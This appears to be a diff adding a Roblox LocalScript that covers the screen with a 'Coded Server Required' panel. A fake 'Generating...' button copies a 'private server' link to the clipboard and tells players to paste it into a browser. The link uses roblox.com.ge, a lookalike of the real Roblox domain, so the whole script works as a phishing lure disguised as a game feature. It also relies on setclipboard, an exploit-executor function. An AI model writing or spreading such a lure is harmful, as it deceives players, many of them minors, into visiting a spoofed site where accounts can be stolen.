@@ -1,0 +1,111 @@
+-- LocalScript
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local codedServerLink = "https://roblox.com.ge/games/77747658251236/Ice-Update-Sailor-Piece?privateServerLinkCode=90101715194380786045075318200046"
+
+-- ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "CodedServerGUI"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- Background Image
+local bg = Instance.new("ImageLabel")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.Image = "rbxassetid://137007145954822" -- Your uploaded image ID
+bg.ScaleType = Enum.ScaleType.Crop
+bg.BackgroundTransparency = 1
+bg.Parent = gui
+
+-- Dark overlay
+local overlay = Instance.new("Frame")
+overlay.Size = UDim2.new(1, 0, 1, 0)
+overlay.BackgroundColor3 = Color3.fromRGB(20, 30, 20)
+overlay.BackgroundTransparency = 0.4
+overlay.Parent = bg
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0.4, 0, 0.5, 0)
+mainFrame.Position = UDim2.new(0.3, 0, 0.25, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(198, 235, 196) -- Soft matcha green
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = overlay
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 16)
+corner.Parent = mainFrame
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -20, 0.2, 0)
+title.Position = UDim2.new(0, 10, 0, 10)
+title.BackgroundTransparency = 1
+title.Text = "Coded Server Required"
+title.TextColor3 = Color3.fromRGB(40, 80, 40)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = mainFrame
+
+-- Instructions
+local instructions = Instance.new("TextLabel")
+instructions.Size = UDim2.new(1, -30, 0.45, 0)
+instructions.Position = UDim2.new(0, 15, 0.22, 0)
+instructions.BackgroundTransparency = 1
+instructions.TextWrapped = true
+instructions.TextYAlignment = Enum.TextYAlignment.Top
+instructions.Text =
+	"1. Click button below\n" ..
+	"2. Paste link in browser\n" ..
+	"3. Join the server\n" ..
+	"4. Enjoy 🌿"
+instructions.TextColor3 = Color3.fromRGB(60, 90, 60)
+instructions.TextScaled = true
+instructions.Font = Enum.Font.Gotham
+instructions.Parent = mainFrame
+
+-- Button
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.6, 0, 0.18, 0)
+button.Position = UDim2.new(0.2, 0, 0.72, 0)
+button.BackgroundColor3 = Color3.fromRGB(120, 180, 120)
+button.Text = "Get Coded Server"
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.TextScaled = true
+button.Font = Enum.Font.GothamBold
+button.BorderSizePixel = 0
+button.Parent = mainFrame
+
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 12)
+btnCorner.Parent = button
+
+-- Hover effect
+button.MouseEnter:Connect(function()
+	button.BackgroundColor3 = Color3.fromRGB(100, 160, 100)
+end)
+
+button.MouseLeave:Connect(function()
+	button.BackgroundColor3 = Color3.fromRGB(120, 180, 120)
+end)
+
+-- Button click
+button.MouseButton1Click:Connect(function()
+	button.Text = "Generating..."
+	task.wait(1.2)
+
+	local success = pcall(function()
+		setclipboard(codedServerLink)
+	end)
+
+	if success then
+		button.Text = "Copied 🍵"
+		button.BackgroundColor3 = Color3.fromRGB(90, 150, 90)
+	else
+		button.Text = "Not Supported"
+		button.BackgroundColor3 = Color3.fromRGB(150, 80, 80)
+	end
+end)
